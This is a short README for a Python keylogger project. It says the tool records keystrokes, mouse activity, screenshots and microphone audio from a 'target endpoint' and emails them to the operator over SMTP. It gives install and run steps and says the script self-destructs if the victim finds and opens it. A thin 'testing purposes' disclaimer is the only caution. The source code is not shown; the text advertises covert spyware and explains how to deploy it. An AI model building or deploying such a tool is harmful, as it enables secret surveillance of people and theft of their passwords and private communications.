  <strong style="font-size:60px;">Improved Python Keylogger</strong>
</h1></br>

This keylogger will send key, mouse, screenshots, and mic inputs to your email. This is for testing purposes. 

# Requirements
Be sure to import the modules in the `main.py`. 

This also depends on having an account created at "https://mailtrap.io/" using temp mail. 

# Usage

1. Set a SMTP Username and Password in `main.py`

2. Run the following command: 
`pip install -r req.txt`

3. Run the following command:
`python3 main.py`

After the above has been completed, you will get data from the target endpoint. If the endpoint user finds the code and the file is opened, the script will self destruct.
